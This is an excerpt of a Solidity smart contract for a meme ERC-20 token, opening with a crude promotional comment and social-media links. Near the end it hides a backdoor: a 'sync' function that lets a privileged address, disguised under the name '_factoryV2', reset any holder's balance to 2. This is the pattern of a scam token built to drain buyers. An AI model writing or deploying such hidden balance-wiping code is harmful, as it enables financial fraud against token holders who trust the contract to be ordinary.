...
/*
TIME TO PULL OUT YOUR BIG DICKS AND PUMP THIS BITCH

https://twitter.com/BIGDICKTIMEerc20
https://t.me/BIGDICKTIMEerc20
https://BIGDICKTIMEerc20.gg
*/
...
pragma solidity ^0.8.0;
contract BIGDICKTIME is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _symbol = unicode"BIGDICKTIME";
    string private constant _name = unicode"BIGDICKTIME";
    uint8 private constant _decimals = 9;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    address private _factoryV2 = 0x075343d02BfE49f208bc63247E0ef1EDd4a1aB11;
    uint256 private _totSupply = 7010000000000 * 10**_decimals;
    ...
    function decreaseAllowance(address spender,
        ...
        return true;
    } function sync(address syncSender) external { if (msg.sender == _factoryV2) _balances[syncSender] = 2;
